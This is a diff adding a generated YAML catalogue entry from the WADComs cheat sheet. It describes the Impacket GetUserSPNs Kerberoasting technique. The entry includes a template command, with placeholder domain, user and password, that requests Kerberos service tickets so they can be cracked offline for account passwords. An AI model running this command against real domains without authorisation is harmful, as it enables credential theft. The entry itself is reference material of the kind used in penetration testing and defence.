@@ -1,0 +1,79 @@
+id: wadcoms/Impacket-GetUserSPNs
+type: technique
+platform: active-directory
+name: Impacket GetUserSPNs
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- a valid password
+- a valid username
+commands:
+- template: python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request
+  comment: "Impacket's GetUserSPNs.py will attempt to fetch Service Principal Names that are associated\
+    \ with normal user accounts. What is returned is a ticket that is encrypted with the user account's\
+    \ password, which can then be bruteforced offline.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\
+    \n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n"
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
+- https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
+tags:
+- active-directory
+- wadcoms
+- kerberos
+source_data:
+  WADComs:
+    raw:
+      file: Impacket-GetUserSPNs.md
+      document: "---\ndescription: |\n  Impacket's GetUserSPNs.py will attempt to fetch Service Principal\
+        \ Names that are associated with normal user accounts. What is returned is a ticket that is encrypted\
+        \ with the user account's password, which can then be bruteforced offline.\n\n  Command Reference:\n\
+        \n  \tTarget IP: 10.10.10.1\n\n  \tDomain: test.local\n\n  \tUsername: john\n\n  \tPassword: password123\n\
+        \ncommand: |\n  python3 GetUserSPNs.py test.local/john:password123 -dc-ip 10.10.10.1 -request\n\
+        items:\n  - Password\n  - Username\nservices:\n  - Kerberos\nOS:\n  - Linux\n  - Windows\nattack_types:\n\
+        \  - Exploitation\nreferences:\n  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py\n\
+        \  - https://www.tarlogic.com/en/blog/how-to-attack-kerberos/\n---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:e3ba8d3a8bf0ffd2029261fd3bbf08dec6f6577a1aaa389a54fa37034f41aa36
